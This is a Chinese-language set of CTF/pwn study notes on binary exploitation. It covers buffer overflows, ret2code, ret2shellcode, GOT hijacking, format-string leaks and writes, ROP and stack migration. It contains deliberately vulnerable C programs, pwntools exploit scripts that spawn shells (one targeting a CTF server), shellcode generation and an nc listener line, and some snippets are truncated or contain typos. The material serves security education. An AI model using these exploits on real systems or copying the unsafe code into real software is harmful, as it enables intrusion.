<ul><li>local variable</li> <li>saved rbp ---&gt; stack migration</li> <li>return address ---&gt; ret2 series</li></ul></li></ul> <p>bof-local variable</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"># <span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><img src="/text_del/assets/img/pwn_stack04.e80dc0f2.jpg" alt=""> <img src="/text_del/assets/img/pwn_stack05.47265dbf.jpg" alt=""></p> <h4 id="如何算offset"><a href="#如何算offset" class="header-anchor">#</a> 如何算offset</h4> <ul><li><p>先随意输入来确定buffer位置</p></li> <li><p>计算buffer位置和目标位置距离多远</p></li></ul> <p><img src="/text_del/assets/img/pwn_stack06.033ebe6d.jpg" alt=""></p> <p>使用radare2</p> <div class="language- extra-class"><pre><code>r2 ./bof1
afl 分析函数
s main 查看main函数
VV 进入视图模式
</code></pre></div><h4 id="使用gdb配合脚本调试"><a href="#使用gdb配合脚本调试" class="header-anchor">#</a> 使用gdb配合脚本调试</h4> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof1'</span><span class="token punctuation">)</span>
<span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 这里断下，执行脚本后看pid是多少比如6113</span>
<span class="token comment"># 新建窗口终端</span>
<span class="token comment"># $gdb</span>
<span class="token comment"># gdb$ attach 6113</span>
s <span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What\'s the secret ?'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'recvuntil'</span> <span class="token operator">+</span> s<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>flat<span class="token punctuation">(</span><span class="token string">'AAAAAAAA'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0xdead</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h4 id="bof-ret2code"><a href="#bof-ret2code" class="header-anchor">#</a> bof-ret2code</h4> <ul><li><p>透过Buffer Overflow 改赞 return address</p></li> <li><p>将return address改到code中任意处</p></li> <li><p>须关闭 PIE</p></li></ul> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"># <span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><img src="/text_del/assets/img/pwn_stack07.9db1df31.jpg" alt=""></p> <h5 id="如何找到address-如何查找函数"><a href="#如何找到address-如何查找函数" class="header-anchor">#</a> 如何找到address? 如何查找函数</h5> <p>三种方式</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>shell$ objdump -M intel -d <span class="token builtin class-name">test</span> <span class="token operator">|</span> <span class="token function">less</span>
gdb-peda$ p shell
r2$ afl~shell
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>retn 返回stack栈顶的地址</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">0x7fffffffe718</span> <span class="token operator">-</span> <span class="token number">0x7fffffffe700</span>
hidden <span class="token operator">=</span> <span class="token number">0x00400566</span>

r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span>offset <span class="token operator">+</span> p64<span class="token punctuation">(</span>hidden<span class="token punctuation">)</span><span class="token punctuation">)</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>进入gets前，和gets的retn对应offset
<img src="/text_del/assets/img/pwn_stack08.1808e33a.jpg" alt=""></p> <p>retn</p> <p><img src="/text_del/assets/img/pwn_stack09.324945d7.jpg" alt=""></p> <h4 id="bof-ret2shellcode"><a href="#bof-ret2shellcode" class="header-anchor">#</a> bof - ret2shellcode</h4> <ul><li><p>透过Buffer Overflow 改赞 return address</p></li> <li><p>将return address改到自己写的shell code处并执行</p></li> <li><p>须关闭 NX</p></li></ul> <p>vmap查看, 开启NX导致w,x不会同时开启。</p> <p><img src="/text_del/assets/img/pwn_stack10.47be226c.jpg" alt=""></p> <p><img src="/text_del/assets/img/pwn_ret2sc.cc0c5292.jpg" alt=""></p> <h5 id="哪里可以写shellcode"><a href="#哪里可以写shellcode" class="header-anchor">#</a> 哪里可以写shellcode?</h5> <ul><li><p>选择含有rwx处</p></li> <li><p>选择中间部分，因为前後可能会有用到</p></li></ul> <p><img src="/text_del/assets/img/pwn_ret2sc02.df541c70.jpg" alt=""></p> <h4 id="libc"><a href="#libc" class="header-anchor">#</a> Libc</h4> <h5 id="lazy-binding"><a href="#lazy-binding" class="header-anchor">#</a> Lazy binding</h5> <ul><li><p>Dynamic linking的程式在执行过程中，有些library中的函式可能到结束都不轨行到</p></li> <li><p>ELF采取Lazy binding的机制，在第一次call function時，才会去找真正的位置进行binding</p></li></ul> <h5 id="plt-got"><a href="#plt-got" class="header-anchor">#</a> plt&amp;got</h5> <ul><li><p>因为Lazy binding的榄制，常要用到library函数时，会call目模函数的plt，接著才call目模函数的 got</p></li> <li><p>got 中存有目模函数在library中真正的位置</p></li></ul> <p><img src="/text_del/assets/img/pwn_plt&amp;got.0f46e86f.jpg" alt=""></p> <h5 id="got-hijacking"><a href="#got-hijacking" class="header-anchor">#</a> GOT Hijacking</h5> <ul><li><p>透过改写GOT使得呼叫函数式，跳到指定位置</p></li> <li><p>不能是Full RELRO</p></li></ul> <p><img src="/text_del/assets/img/pwn_plt&amp;got2.6e252e31.jpg" alt=""></p> <h5 id="exp"><a href="#exp" class="header-anchor">#</a> exp</h5> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof2'</span><span class="token punctuation">)</span>

puts_got <span class="token operator">=</span> <span class="token number">0x601018</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="fmt"><a href="#fmt" class="header-anchor">#</a> fmt</h3> <ul><li><p>Format string attack</p></li> <li><p>Read - information leak:</p> <ul><li>PIE, stack heap libc ASLR, cannary</li></ul></li> <li><p>Write - almost write every where</p></li> <li><p>Powerful vulnerablility</p></li></ul> <p>往后进行 overflow, 覆盖到 rbp</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">fprintf</span><span class="token punctuation">(</span> FILE<span class="token operator">*</span> stream<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">vprintf</span><span class="token punctuation">(</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> format<span class="token punctuation">,</span> va_list arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">vfprintf</span><span class="token punctuation">(</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> format<span class="token punctuation">,</span> va_list arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">vprintf</span><span class="token punctuation">(</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> format<span class="token punctuation">,</span> va_list arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">vprintf</span><span class="token punctuation">(</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> format<span class="token punctuation">,</span> va_list arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">vdprintf</span><span class="token punctuation">(</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> format<span class="token punctuation">,</span> va_list ap<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>正面这个即使保护全开也能拿到 shell</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">&quot;%s&quot;</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>gdb ./echo
b printf
r
输入 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>TODO gdb 源码调试</p> <p>fmt 可控</p> <p>--  Constrains</p> <div class="language- extra-class"><pre><code>-- fmt 长度很短
-- 过滤
</code></pre></div><h4 id="fmt-read"><a href="#fmt-read" class="header-anchor">#</a> fmt - read</h4> <ul><li><p>int printf( const char* format, ...);</p></li> <li><p>rdi, rsi, rdx, rcx, r8, r9, STACK</p></li> <li><p>rdi -&gt; fmt</p></li> <li><p>%d, %p, %s, %c, %x -&gt; read data on the stack</p></li> <li><p>information leak</p></li></ul> <p>正常参数是按顺序放  rdi, rsi, rdx, rcx, r8, r9, STACK的。</p> <p>实际输入 %x%x 就只是把 format 放到 rdi，那么就会直接读出 stack 上面的内容。就把 stack leak 出来。</p> <p>能控 formatstring, 从第6个开始就可以从 stack 上一直读了。register内容读完就是 stack 的值了</p> <p>pintf(buf);</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>input<span class="token operator">:</span> <span class="token string">&quot;aaaaaaa&quot;</span>
output<span class="token operator">:</span> <span class="token string">&quot;aaaaaaa&quot;</span>

input<span class="token operator">:</span> <span class="token string">&quot;%p.%p.%p&quot;</span>
output<span class="token operator">:</span> <span class="token string">&quot;0x7fbdb0e858b0, 0x1, 0x3&quot;</span>
        rdi              rsi  rdx

input<span class="token operator">:</span> <span class="token string">&quot;%3$p&quot;</span>
output<span class="token operator">:</span> <span class="token string">&quot;0x3&quot;</span>

input<span class="token operator">:</span> <span class="token string">&quot;%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span>
output<span class="token operator">:</span> <span class="token string">&quot;0x7fbdb0e858b0, 0x1, 0x7ffff7dd48b0, 0x555555554846.0x4.0x7052e7052e7025.0x252e70252e70252e&quot;</span>
        rdi              rsi  rdx              rcx            r8  r9               stack

已进入main函数了 <span class="token operator">-</span><span class="token number">8</span>对齐
x<span class="token operator">/</span><span class="token number">64</span>gx $rsp<span class="token operator">-</span><span class="token number">8</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>BambooFox-2018-2019年合集-107学年社课 (P2. 程式安全-pwn2)</p> <h4 id="fmt-write"><a href="#fmt-write" class="header-anchor">#</a> fmt - write</h4> <p>将已输出之字元数目当成interger值（4bytes），写入address。</p> <p>e.g</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">// fmt_write.c</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;a = %d\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;123abc%d\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// printf(&quot;%100c%d\n&quot;, 0, a);</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;a = %d\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//a = 6</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>printf(&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%n&quot;, &amp;ptr)</p> <p>printf(&quot;%100c%n&quot;, &amp;char, &amp;ptr)</p> <p>printf(&quot;%100c%n&quot;, 0, &amp;ptr)</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">// fmt_write.c</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;a = %d\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%100c%d\n&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;a = %d\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//a=100</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>16进制显示
<code>./fmt_write.c | xxd</code></p> <p>大量写入不稳定，需要sleep等一下。或使用又下的方法</p> <ul><li><p>%100c%n -&gt; 写入4bytes \x64\x00\x00\x00</p></li> <li><p>%100c%hn -&gt; 写入2bytes \x64\x00\</p></li> <li><p>%100c%hhn -&gt; 写入1bytes \x64</p></li></ul> <h4 id="fmt-exploit"><a href="#fmt-exploit" class="header-anchor">#</a> fmt - exploit</h4> <ul><li><p>If format string is stored on the stack：</p> <ul><li>将address放置放payload，得知address位於第n個参数，用%n$去refenrence它。</li></ul></li> <li><p>%nSp-&gt;leak libc，PIE，Heap，Stack:bypass ASLR</p></li> <li><p>%n$n-&gt;write value</p></li> <li><p>read &amp;write everywhere</p></li></ul> <p>如果fomrat string在stack上。那可以把address放在format string上。 用%s leak, format sting后面+个8bytes的printf 的GOT。再算好address位置。</p> <p>%100c%n%100c%n
第一个%n会写100，第二个%n会写200，只能从小往大排列好再写。</p> <p>pwn_02_fmt_write.py</p> <p>當format string不在stack上，如位於global.bss</p> <p>無法利用fmt payload來放address</p> <p>尋找stack上有利残留值</p> <p>pointer， address</p> <ul><li><p>libc text</p></li> <li><p>stack</p></li></ul> <p>通常找到的address固定，只能往同個地方寫，但希望能拆開寫</p> <p>·希望找到一個stack address ，其指向之地方又是stack address 。</p> <p>·利用第一個address來改寫第二個address ，用第二個address來建構真的要的address。</p> <p>√  RBP Chain</p> <h3 id="rop-gadget"><a href="#rop-gadget" class="header-anchor">#</a> ROP Gadget</h3> <p>结尾是ret的程序代码段</p> <div class="language- extra-class"><pre><code>pop rax
ret
</code></pre></div><p>或</p> <div class="language- extra-class"><pre><code>mov rax,rbx
ret
</code></pre></div><p>或</p> <div class="language- extra-class"><pre><code>lea rax,[local_8h]
mov, rdi, rax
mov eax, 0
call sym.imp.gets
ret
</code></pre></div><p>% ROPgadget --binary ./test | grep 'pop rax.*ret'</p> <h3 id="stack-migration"><a href="#stack-migration" class="header-anchor">#</a> stack migration</h3> <ul><li>ROP chain</li> <li>x64 addres -&gt; 8bytes</li> <li>long return address sled</li> <li>Not engough memory to prepare ROP chain</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>leave ret gadget

mov rsp， rbp
pop rbp

Overflow fake rbp -&gt; leave ret
rbp -&gt; fake rbp
ret -&gt; leave ret gadget

leave ret again：
mov rsp， rbp-&gt;將stack搬至fake rbp
pop rbp
ret-&gt;跳到新的rop chain
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><ul><li>将Stack搬到可存储ROP playload的地方</li> <li>在有限的情况下，利用stack migration让ROP持续活下去</li></ul> <h3 id="uaf原理"><a href="#uaf原理" class="header-anchor">#</a> UAF原理</h3> <p>https://mp.weixin.qq.com/s/Jg6Usu58LXnHarMsR9Ok8w</p> <h2 id="常用命令"><a href="#常用命令" class="header-anchor">#</a> 常用命令</h2> <p><a href="https://blog.csdn.net/weixin_42072280/article/details/90229294" target="_blank" rel="noopener noreferrer">checksec<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> <code>[filename]</code></p> <div class="language- extra-class"><pre><code>/Downloads/level0'
    Arch:     amd64-64-little # 64位
    RELRO:    No RELRO
    Stack:    No canary found # 程序编译时关了栈不可执行保护
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    # 这说明我们可以在buf里面输入shellcode和填充字符
    # 并且让函数的返回地址覆盖成buf的栈上地址 来实现栈溢出攻击
</code></pre></div><p>通常定义变量时 后面跟 一个bp 大小(8bytes/64位, 4bytes/32位)</p> <p>ldd filename  通过ldd查找libc共享库</p> <h2 id="pwntools"><a href="#pwntools" class="header-anchor">#</a> pwntools</h2> <p><a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener noreferrer">Link<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h3 id="本地启动"><a href="#本地启动" class="header-anchor">#</a> 本地启动</h3> <p>nc -vc ./fmt -kl 3333</p> <p>然后其他机器就可以nc ip port连接了</p> <h3 id="怎样调试"><a href="#怎样调试" class="header-anchor">#</a> 怎样调试</h3> <p>方法1</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
<span class="token comment"># gdb.attach(sh, 'b *0x1234')</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>方法2</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
<span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
这时看pid，比如是 <span class="token number">6533</span><span class="token punctuation">,</span> 新建终端，
$gdb
$attach <span class="token number">6533</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="指令介绍"><a href="#指令介绍" class="header-anchor">#</a> 指令介绍</h3> <p>p32、p64是64/32位代码 打包为二进制，u32、u64是解包为二进制</p> <p><strong>flat模块能将pattern字符串和地址结合并且转为字节模式</strong></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x804a060</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlijneafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> flat<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8c</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x804a024</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>symbols</p> <div class="language- extra-class"><pre><code>ELF('./level3').symbols['main']
ELF('./level3').sym['main']
</code></pre></div><p>gdb.attach(sh) # gdb附加到调试</p> <h3 id="示例"><a href="#示例" class="header-anchor">#</a> 示例</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span> <span class="token comment"># 能显示调试信息</span>
<span class="token comment">#io = process('./level1') </span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span> <span class="token number">9877</span><span class="token punctuation">)</span> <span class="token comment"># 远程连接</span>
text <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment"># 获取返回值</span>
<span class="token comment"># recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\n</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># pwntools生成的 sh 的shellcode</span>
p64<span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span> <span class="token comment"># 地址转 64 位二进制</span>
